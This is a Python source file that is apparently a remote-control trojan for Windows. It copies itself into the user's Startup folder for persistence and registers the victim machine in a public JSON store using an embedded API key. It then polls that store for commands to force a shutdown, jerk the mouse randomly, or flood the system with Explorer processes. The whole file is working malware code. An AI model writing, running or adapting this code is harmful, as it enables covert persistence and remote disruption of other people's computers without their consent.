from asyncio import threads
import requests
import json
import socket
import urllib.parse as urlparse
import os
import sys
import mouse
import screeninfo
import random
import shutil
import string
import subprocess
import threading


if getattr(sys, "frozen", False):
    shutil.move(os.path.join(os.path.dirname(sys.executable), sys.executable.split("\\")[-1]), os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", sys.executable.split("\\")[-1]))
elif __file__:
    shutil.move(os.path.join(os.path.dirname(__file__), __file__.split("\\")[-1]), os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", __file__.split("\\")[-1]))
alpha = string.ascii_lowercase+string.ascii_uppercase
width = screeninfo.get_monitors()[0].width
height = screeninfo.get_monitors()[0].height
host = socket.gethostname().lower() + "r" + alpha[random.randint(0, len(alpha)-1)] + alpha[random.randint(0, len(alpha)-1)] + alpha[random.randint(0, len(alpha)-1)] + "e" + alpha[random.randint(0, len(alpha)-1)] + alpha[random.randint(0, len(alpha)-1)] + "a" + alpha[random.randint(0, len(alpha)-1)] + alpha[random.randint(0, len(alpha)-1)] + alpha[random.randint(0, len(alpha)-1)] + alpha[random.randint(0, len(alpha)-1)] +"l"
getheaders = {
    "Api-Key": "47229801-f65c-4ae1-a65a-b5abfb723ac2",
}
putheaders = {
    "Api-Key": "47229801-f65c-4ae1-a65a-b5abfb723ac2",
    "Content-Type": "application/json"
}
store_name = "Remote"
threadlst = []


def get():
    global getheaders
    global store_name
    try:
        getjson = requests.get("https://json.psty.io/api_v1/stores/{}".format(urlparse.quote_plus(store_name)), headers=getheaders, verify=False)
    except Exception as e:
        return [0, e]
    if getjson.status_code != 200:
        return getjson.status_code
    else:
        return getjson.text

def explorer():
    while True:
        for i in string.ascii_uppercase:
            if os.path.exists(i+":\\"):
                subprocess.Popen("explorer /select,"+i+":\\")
                break

while True:
    res = get()
    if type(res) == str:
        res = json.loads(res)
        resdata = res["data"]
        putdata = resdata
        # putdata.pop("computers")
        rescomps = resdata["computers"]
        if not host in rescomps:
            rescomps[host] = {"shutdown": 0, "mousevirus": 0, "explorercrash": 0}
        if not "shutdown" in rescomps[host].keys():
            rescomps[host]["shutdown"] = 0
        if not "mousevirus" in rescomps[host].keys():
            rescomps[host]["mousevirus"] = 0
        if not "explorercrash" in rescomps[host].keys():
            rescomps[host]["explorercrash"] = 0
        putdata["computers"] = rescomps
        putjson = requests.put("https://json.psty.io/api_v1/stores/{}".format(urlparse.quote_plus(store_name)), headers=putheaders, json=putdata, verify=False)
        if rescomps[host]["shutdown"] == 1:
            os.system("shutdown /s /f /t 0")
        if rescomps[host]["mousevirus"] == 1:
            for movement in range(50):
                mouse.move(random.randint(0, width), random.randint(0, height))
        if rescomps[host]["explorercrash"] == 1:
            for nthreadcnt in range(50):
                newthread = threading.Thread(target=explorer)
                newthread.daemon = True
                threadlst.append(newthread)
            for thread in threadlst:
                thread.start()
            for thread in threadlst:
                thread.join()
    else:
        print(res)
